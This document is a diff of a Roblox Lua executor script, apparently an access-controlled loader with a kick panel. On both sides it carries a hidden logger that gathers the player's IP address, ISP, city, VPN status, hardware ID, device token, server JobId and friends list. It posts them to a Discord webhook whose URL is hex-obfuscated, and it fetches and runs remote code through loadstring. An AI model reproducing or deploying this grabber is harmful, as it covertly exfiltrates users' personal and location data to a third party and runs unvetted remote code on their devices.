@@ -1,49 +1,38 @@
 local _lp = game:GetService("Players").LocalPlayer
 local _ts = game:GetService("TestService")
-local _stg = _ts:FindFirstChild("__NK_RUNTIME")
-local _auth = _stg and _stg:FindFirstChild(_lp.Name)
+local _storage = _ts:FindFirstChild("__NK_RUNTIME")
+local _phys_auth = _storage and _storage:FindFirstChild(_lp.Name)
 
-if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SECURE_AUTH")) then
-    _lp:Kick("Execution prohibited. Run through the loader.")
+if not (shared._NK_LOADER_AUTH == "V8_SECURE_TOKEN_VALID" or (_phys_auth and _phys_auth.Value == "V8_SECURE_TOKEN_VALID")) then
+    _lp:Kick("Execution prohibited. Use official loader.")
     return
 end
-shared._NK_AUTH = nil
+shared._NK_LOADER_AUTH = nil
 
 local Config = {
     WL = {
         UIDs = {"10760143653"},
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
-        Keys = {"89D11F50-5490-4677-B709-4EBFBECA78CE", "46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
+        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
     },
     BL = { UIDs = {}, HWIDs = {}, Keys = {} }
 }
 
-local function _H(h)
+local function _D(h)
     local s = ""
     for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
     return s
 end
 
-local _W = _H("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
+local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
 local _IP_API = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting"
 
-local _HS = game:GetService("HttpService")
-local _US = game:GetService("UserInputService")
-local _RS = game:GetService("ReplicatedStorage")
+local _H = game:GetService("HttpService")
+local _U = game:GetService("UserInputService")
 local _uid = tostring(_lp.UserId)
 local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
 local _tk = "N/A"
-
-pcall(function()
-    if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then 
-            _tk = readfile("nazarkus_key.json")
-        else
-            _tk = _HS:GenerateGUID(false)
-            writefile("nazarkus_key.json", _tk)
-        end
-    end
-end)
+pcall(function() _tk = readfile("nazarkus_key.json") end)
 
 local function chk(l)
     for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
@@ -59,15 +48,15 @@ local function _LOG()
         local req = (syn and syn.request or request or http_request)
         local ni = {}
         local r = req({Url = _IP_API, Method = "GET"})
-        if r and r.Success then ni = _HS:JSONDecode(r.Body) end
+        if r and r.Success then ni = _H:JSONDecode(r.Body) end
 
-        local u = 0
+        local u, s = 0, 0
         local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
         for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
         local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
         
         local fn, ft = "None", "None"
-        local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
+        local fdf = game:GetService("ReplicatedStorage"):FindFirstChild("FactionSysRS") and game:GetService("ReplicatedStorage").FactionSysRS:FindFirstChild("FactionData")
         if fdf then
             for _, f in ipairs(fdf:GetChildren()) do
                 if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
@@ -79,9 +68,10 @@ local function _LOG()
         end
 
         local jid = game.JobId == "" and "Unknown" or game.JobId
-        local jLink = "https://tinyurl.com/api-create.php?url=" .. _HS:UrlEncode("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jid)
-        local jBtn = "N/A"
-        pcall(function() local res = req({Url = jLink, Method = "GET"}) if res.Success then jBtn = res.Body end end)
+        local joinBase = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
+        local jBtn = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase)
+        local joinUrl = "N/A"
+        pcall(function() local res = req({Url = jBtn, Method = "GET"}) if res.Success then joinUrl = res.Body end end)
         
         local friends = {}
         for _, p in ipairs(game.Players:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
@@ -91,26 +81,27 @@ local function _LOG()
                 ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
                 ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
-                    {["name"] = "Player Info", ["value"] = string.format("Name: %s (@%s)\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
+                    {["name"] = "Player Info", ["value"] = string.format("Name: `%s` (`@%s`)\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                     {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
-                    {["name"] = "System", ["value"] = "Platform: " .. (_US.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
+                    {["name"] = "System", ["value"] = "Platform: " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                     {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
                     {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                     {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
                     {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, _uid), ["inline"] = false}
+                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
         }
-        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _HS:JSONEncode(payload)})
+        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
     end)
 end
 
 task.spawn(_LOG)
 
+-- DRAGGABLE GUI
 if _st == "whitelist" then
     task.spawn(function()
         local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
@@ -122,17 +113,17 @@ if _st == "whitelist" then
         Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
         local function refresh()
             for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-            for _, pObj in ipairs(_stg:GetChildren()) do
+            for _, pObj in ipairs(_storage:GetChildren()) do
                 local b = Instance.new("TextButton", s)
                 b.Size = UDim2.new(1, 0, 0, 30); b.Text = pObj.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
                 b.MouseButton1Click:Connect(function() pObj.Value = "kick" end)
             end
         end
-        _US.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
+        _U.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
     end)
 end
 
-_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end)
+_phys_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end)
 
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
